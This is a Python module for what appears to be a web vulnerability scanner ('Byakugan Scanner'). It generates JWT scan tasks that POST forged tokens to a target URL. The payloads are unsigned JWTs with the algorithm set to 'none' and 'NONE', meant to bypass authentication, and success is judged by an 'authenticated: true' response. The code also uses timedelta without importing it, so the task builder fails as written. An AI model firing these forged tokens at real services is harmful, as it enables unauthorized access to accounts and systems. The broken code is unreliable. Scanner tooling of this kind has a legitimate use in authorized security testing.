from typing import List, Dict
import uuid
from datetime import datetime

class TaskGenerator:
    def __init__(self, config: Dict):
        self.config = config

    def create_jwt_scan_task(self, target_url: str, token: str) -> Dict:
        """Creates a JWT scan task based on jwt.scantask template"""
        return {
            "task_id": f"TASK-JWT-{uuid.uuid4().hex[:8]}",
            "target": {
                "url": target_url,
                "method": "POST",
                "protocol": "https"
            },
            "auth_context": {
                "type": "JWT",
                "token": token,
                "expires_at": int((datetime.utcnow() + \
                                 timedelta(hours=1)).timestamp()),
                "headers": {
                    "Authorization": f"Bearer {token}"
                }
            },
            "payload": {
                "headers": {
                    "Content-Type": "application/json",
                    "User-Agent": "Byakugan Scanner/1.0"
                },
                "body": {
                    "token": "{{injection_point}}"
                },
                "insertion_points": [
                    {
                        "location": "body.token",
                        "type": "jwt_token",
                        "payloads": [
                            "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.{{original_payload}}.",
                            "eyJ0eXAiOiJKV1QiLCJhbGciOiJOT05FIn0.{{original_payload}}."
                        ]
                    }
                ]
            },
            "validation": self._get_validation_config()
        }

    def _get_validation_config(self) -> Dict:
        return {
            "success_conditions": {
                "status_codes": [200, 201, 202],
                "response_patterns": [
                    "\"authenticated\": true",
                    "\"status\": \"success\""
                ]
            },
            "evidence_collection": {
                "save_request": True,
                "save_response": True,
                "screenshot": False
            }
        }